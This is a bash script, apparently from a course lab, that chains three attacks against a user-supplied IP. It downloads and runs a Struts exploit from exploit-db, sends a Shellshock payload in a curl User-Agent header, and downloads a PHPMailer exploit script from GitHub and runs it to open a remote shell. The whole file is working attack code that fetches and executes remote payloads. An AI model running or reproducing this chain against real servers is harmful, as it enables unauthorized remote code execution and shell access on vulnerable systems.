#!/usr/bin/env bash

echo -e "\e[36mPlease enter the IP address of the box:\e[0m"

read ipaddress

echo -e "\e[31mBegining exploit of $ipaddress\e[0m"
echo -e "\e[31m---------------------------------------------------------------------\e[0m"

sleep 2

echo -e "\e[31mDownloading struts exploit\e[0m"
sleep 3
wget https://www.exploit-db.com/raw/41570/
mv index.html strutsexploit.py

echo ""
echo ""
echo ""
sleep 1
echo -e "\e[31mexploiting struts\e[0m"
python strutsexploit.py http://$ipaddress:80 whoami
rm strutsexploit.py

sleep 1
echo -e "\e[32;1mStrusts exploited\e[0m"
echo ""
echo ""
echo ""
echo ""
sleep 3

echo -e "\e[36mStarting Shellshock Vulnerability\e[0m"
echo""
sleep 1

echo -e "\e[31mSending curl request with injected bash command to print version of bash running on server\e[0m"
sleep 1
curl -A '() { :;}; echo "Content-type: text/plain"; echo; /bin/bash -c "bash --version"' http://$ipaddress:9090/cgi-bin/vulnerable
echo""
echo -e "\e[32;1mShellshock exploited\e[0m"

sleep 3
echo ""
echo""
echo""
echo -e "\e[36mStarting PHPmailer Vulnerability\e[0m"
echo""
echo""
echo""
echo -e "\e[31mEstablishing Remote Shell.  This may take some time\e[0m"

wget https://raw.githubusercontent.com/mrg5103/ist242/master/phpmex.sh

bash phpmex.sh $ipaddress:8080
rm phpmex.sh
echo -e "\e[32;1mPHPmailer exploited\e[0m"
echo ""
echo ""
echo ""
sleep 3
echo -e "\e[32;1mExploits Finished.  Exiting...\e[0m"
sleep 2
